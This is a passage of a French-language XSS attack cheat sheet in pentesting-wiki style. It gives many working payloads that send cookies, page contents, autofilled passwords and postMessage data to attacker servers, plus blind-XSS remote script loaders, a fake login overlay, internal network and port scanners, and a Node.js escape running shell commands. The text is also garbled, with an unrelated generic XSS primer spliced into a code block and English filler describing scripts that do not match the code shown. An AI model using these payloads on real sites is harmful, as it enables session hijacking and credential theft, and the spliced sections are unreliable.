```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```
### Obfuscation & Contournement avancé

* **Différentes obfuscations sur une seule page:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* JSFuck plus sophistiqué: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>

```javascript
//aaencode
# XSS (Cross-Site Scripting)

Le XSS (Cross-Site Scripting) est une vulnérabilité courante dans les applications Web qui permet à un attaquant d'injecter du code malveillant dans les pages Web consultées par les utilisateurs. Cela peut entraîner des attaques telles que le vol de sessions, le vol de cookies et la redirection vers des sites Web malveillants.

## Types de XSS

Il existe trois types de XSS :

1. XSS stocké : le code malveillant est stocké sur le serveur et est renvoyé à chaque fois que la page est consultée.
2. XSS réfléchi : le code malveillant est inclus dans un lien ou un formulaire et est renvoyé à la victime lorsqu'elle clique sur le lien ou soumet le formulaire.
3. XSS basé sur le DOM : le code malveillant est injecté dans le DOM (Document Object Model) de la page Web et est exécuté côté client.

## Prévention du XSS

Pour prévenir les attaques XSS, il est important de mettre en place les mesures suivantes :

1. Échapper les caractères spéciaux : les données provenant des utilisateurs doivent être correctement échappées pour empêcher l'exécution de code malveillant.
2. Valider et filtrer les entrées utilisateur : toutes les entrées utilisateur doivent être validées et filtrées pour s'assurer qu'elles ne contiennent pas de code malveillant.
3. Utiliser des bibliothèques de sécurité : utilisez des bibliothèques de sécurité telles que OWASP ESAPI pour faciliter l'échappement des caractères spéciaux et la validation des entrées utilisateur.
4. Mettre en place des politiques de sécurité des navigateurs : configurez les en-têtes de réponse HTTP pour limiter les risques de XSS.
5. Sensibiliser les développeurs : les développeurs doivent être conscients des risques de XSS et être formés aux meilleures pratiques de sécurité.

## Exemple de code XSS

Voici un exemple de code XSS :

```javascript
<script>
  alert('Ce site a été piraté !');
  // Code malveillant supplémentaire...
</script>
```

Ce code injecte un script malveillant qui affiche une alerte sur la page Web. Les attaquants peuvent utiliser des techniques plus avancées pour voler des informations sensibles ou rediriger les utilisateurs vers des sites Web malveillants.

## Conclusion

Le XSS est une vulnérabilité dangereuse qui peut compromettre la sécurité des applications Web. Il est essentiel de mettre en place des mesures de prévention appropriées pour protéger les utilisateurs contre les attaques XSS.

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS payloads courants

### Plusieurs payloads en 1

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### Récupérer les cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
Vous **ne pourrez pas accéder aux cookies depuis JavaScript** si le drapeau HTTPOnly est défini dans le cookie. Mais ici, vous avez [quelques moyens de contourner cette protection](../hacking-with-cookies/#httponly) si vous avez de la chance.
{% endhint %}

### Voler le contenu de la page
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### Trouver les adresses IP internes

To find internal IPs, you can use various techniques during a penetration test. These techniques involve exploiting vulnerabilities in web applications to gather information about the internal network.

#### 1. Cross-Site Scripting (XSS)

XSS vulnerabilities can be leveraged to execute malicious scripts on a victim's browser. By injecting a script that sends the victim's internal IP address to an external server, you can obtain the internal IP.

#### 2. Server-Side Request Forgery (SSRF)

SSRF vulnerabilities allow an attacker to make requests from the server to internal resources. By crafting a request to a service that reveals internal IP addresses, you can obtain the internal IPs.

#### 3. Error-Based Information Leakage

Some error messages may inadvertently disclose internal IP addresses. By carefully analyzing error messages, you may find internal IPs exposed.

#### 4. DNS Rebinding

DNS rebinding attacks can be used to bypass the same-origin policy and access internal resources. By setting up a malicious DNS server, you can trick the victim's browser into making requests to internal IPs.

#### 5. Port Scanning

Port scanning can be used to identify open ports on a target system. By scanning a target's IP range, you can discover internal IPs that respond to the scan.

It is important to note that these techniques should only be used in controlled environments with proper authorization. Unauthorized use of these techniques is illegal and unethical. Always ensure you have permission before conducting any penetration testing activities.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### Scanner de ports (fetch)

The `port-scanner-fetch.js` script is a simple port scanner that uses the `fetch` function in JavaScript to send HTTP requests to a target host and port. It can be used to quickly check if a specific port is open or closed.

To use the script, you need to provide the target host and port as command-line arguments. For example:

```shell
node port-scanner-fetch.js example.com 80
```

This will send an HTTP request to `example.com` on port `80` and display the result. If the port is open, the script will print `Port 80 is open`. If the port is closed or the request times out, it will print `Port 80 is closed`.

Please note that port scanning can be considered illegal or unethical without proper authorization. Always ensure that you have the necessary permissions before conducting any port scanning activities.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Scanner de ports (websockets)

This tool is a port scanner specifically designed for websockets. It allows you to scan for open ports on a target server that supports the websocket protocol. The scanner sends a connection request to each port and waits for a response. If a response is received, it means that the port is open and the websocket service is running.

#### Usage

To use the port scanner, you need to provide the target server's IP address and the range of ports you want to scan. The scanner will then attempt to connect to each port within the specified range.

```
python port_scanner.py <target_ip> <start_port> <end_port>
```

Replace `<target_ip>` with the IP address of the server you want to scan. `<start_port>` and `<end_port>` should be replaced with the range of ports you want to scan. For example, to scan ports 1 to 100 on a server with IP address 192.168.0.1, you would run:

```
python port_scanner.py 192.168.0.1 1 100
```

The scanner will display the status of each port it scans, indicating whether it is open or closed. It will also provide a summary of the scan results once it has finished scanning all the ports.

#### Example

Here is an example of using the port scanner to scan ports 1 to 100 on a server with IP address 192.168.0.1:

```
python port_scanner.py 192.168.0.1 1 100
```

Output:

```
Scanning ports 1 to 100 on 192.168.0.1...

Port 22: Open
Port 80: Closed
Port 443: Open

Scan completed. Open ports found: 2
```

In this example, ports 22 and 443 are open, while port 80 is closed. The scan results indicate that there are 2 open ports on the target server.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Les temps courts indiquent un port qui répond_ _Les temps plus longs indiquent l'absence de réponse._

Consultez la liste des ports interdits dans Chrome [**ici**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc) et dans Firefox [**ici**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Boîte pour demander des identifiants
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Capture des mots de passe auto-remplis

Lors de tests d'intrusion sur des applications web, il est courant de rechercher des vulnérabilités de type Cross-Site Scripting (XSS). L'une des variantes les plus intéressantes de cette vulnérabilité est l'exploitation des mots de passe auto-remplis.

Lorsque les utilisateurs enregistrent leurs informations de connexion sur un site web, leur navigateur propose souvent de les sauvegarder pour un remplissage automatique ultérieur. Cela peut être pratique pour les utilisateurs, mais cela peut également représenter une faille de sécurité si le site web est vulnérable à une attaque XSS.

L'attaque consiste à injecter un script malveillant dans un champ de saisie du site web, qui sera ensuite exécuté lorsque le navigateur remplira automatiquement les informations de connexion. Le script peut être conçu pour capturer les informations de connexion, telles que les noms d'utilisateur et les mots de passe, et les envoyer à un attaquant.

Pour exploiter cette vulnérabilité, un attaquant doit identifier un point d'injection XSS sur le site web cible. Cela peut être un champ de saisie de formulaire, un champ de commentaire ou tout autre élément interactif qui accepte des entrées utilisateur. Une fois le point d'injection identifié, l'attaquant peut injecter un script malveillant qui sera exécuté lors du remplissage automatique des informations de connexion.

Il est important de noter que cette attaque ne fonctionnera que si le site web est vulnérable à une attaque XSS. Les développeurs doivent mettre en place des mesures de sécurité appropriées pour prévenir les attaques XSS, telles que la validation et l'échappement des entrées utilisateur.

Pour les testeurs d'intrusion, il est essentiel de vérifier si un site web est vulnérable à cette attaque en effectuant des tests de sécurité approfondis, y compris des tests d'injection XSS. En identifiant et en signalant ces vulnérabilités, les développeurs peuvent prendre les mesures nécessaires pour les corriger et renforcer la sécurité de leurs applications web.
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Lorsque des données sont saisies dans le champ du mot de passe, le nom d'utilisateur et le mot de passe sont envoyés au serveur de l'attaquant, même si le client sélectionne un mot de passe enregistré et ne saisit rien, les informations d'identification seront exfiltrées.

### Enregistreur de frappe

En cherchant simplement sur Github, j'en ai trouvé quelques-uns différents :

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* Vous pouvez également utiliser Metasploit `http_javascript_keylogger`

### Vol de jetons CSRF
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Vol de messages PostMessage

Lors de l'audit d'une application web, il est important de vérifier si des vulnérabilités de type Cross-Site Scripting (XSS) sont présentes. Une variante de cette vulnérabilité est connue sous le nom de vol de messages PostMessage.

#### Qu'est-ce que PostMessage ?

PostMessage est une méthode JavaScript qui permet à différentes fenêtres ou onglets d'un navigateur de communiquer entre eux. Elle est souvent utilisée pour permettre à une application web d'envoyer des messages à une iframe hébergée sur un autre domaine.

#### Comment fonctionne le vol de messages PostMessage ?

Lorsqu'une application web utilise PostMessage pour communiquer avec une iframe, il est important de s'assurer que les messages reçus proviennent bien de la source attendue. Dans le cas contraire, un attaquant pourrait exploiter cette vulnérabilité pour voler des informations sensibles.

L'attaque de vol de messages PostMessage consiste à injecter du code malveillant dans une page web vulnérable. Lorsque cette page communique avec une iframe à l'aide de PostMessage, l'attaquant peut intercepter les messages et voler les données qu'ils contiennent.

#### Comment se protéger contre le vol de messages PostMessage ?

Pour se protéger contre le vol de messages PostMessage, il est recommandé de mettre en place les mesures suivantes :

1. Valider l'origine des messages reçus : Avant de traiter un message reçu via PostMessage, vérifiez que l'origine du message correspond bien à celle attendue.

2. Utiliser des méthodes de communication sécurisées : Si possible, utilisez des méthodes de communication sécurisées telles que HTTPS pour réduire les risques d'interception des messages.

3. Éviter d'utiliser des messages sensibles : Évitez d'envoyer des messages contenant des informations sensibles via PostMessage. Si nécessaire, chiffrez les données avant de les envoyer.

En suivant ces bonnes pratiques, vous pouvez réduire les risques de vol de messages PostMessage et renforcer la sécurité de votre application web.
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Abus des travailleurs de service

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### Polyglottes

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Charges utiles XSS aveugles

Vous pouvez également utiliser: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### Regex - Accéder au contenu caché

À partir de [**cette explication**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay), il est possible de constater que même si certaines valeurs disparaissent du JS, il est toujours possible de les trouver dans les attributs JS de différents objets. Par exemple, il est toujours possible de trouver une entrée REGEX même après que la valeur de l'entrée de la REGEX ait été supprimée :
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### Liste de Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## Exploitation de vulnérabilités XSS

### XSS dans Markdown

Peut-on injecter du code Markdown qui sera rendu ? Peut-être pouvez-vous obtenir une XSS ! Vérifiez :

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS vers SSRF

Avez-vous trouvé une XSS sur un **site qui utilise le caching** ? Essayez de **l'améliorer en SSRF** grâce à une injection de Edge Side Include avec cette charge utile :
```python
<esi:include src="http://yoursite.com/capture" />
```
Utilisez-le pour contourner les restrictions des cookies, les filtres XSS et bien plus encore !\
Plus d'informations sur cette technique ici : [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md).

### XSS dans la création dynamique de PDF

Si une page web crée un PDF à l'aide d'une entrée contrôlée par l'utilisateur, vous pouvez essayer de **tromper le bot** qui crée le PDF en lui faisant exécuter du **code JS arbitraire**.\
Ainsi, si le **bot créateur de PDF trouve** des **balises HTML**, il va les **interpréter**, et vous pouvez **exploiter** ce comportement pour provoquer un **XSS côté serveur**.

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

Si vous ne pouvez pas injecter de balises HTML, il peut être intéressant d'essayer d'**injecter des données PDF** :

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### XSS dans Amp4Email

AMP est une technologie connue pour développer des pages web ultra-rapides sur les clients mobiles. **AMP est un ensemble de balises HTML soutenues par JavaScript** qui permettent facilement des fonctionnalités avec une attention particulière sur les performances et la sécurité. Il existe des [composants AMP](https://amp.dev/documentation/components/?format=websites) pour tout, des carrousels aux éléments de formulaire réactifs, en passant par la récupération de contenu frais à partir de points d'extrémité distants.

Le format [**AMP pour les e-mails**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) fournit [un sous-ensemble de composants AMP](https://github.com/ampproject/amphtml/blob/master/docs/spec/email/amp-email-components.md) que vous pouvez utiliser dans les messages électroniques. Les destinataires des e-mails AMP peuvent voir et interagir avec les composants AMP directement dans l'e-mail.

Exemple de [**writeup XSS dans Amp4Email dans Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### XSS en téléchargeant des fichiers (svg)

Téléchargez en tant qu'image un fichier comme celui-ci (à partir de [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)) :
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
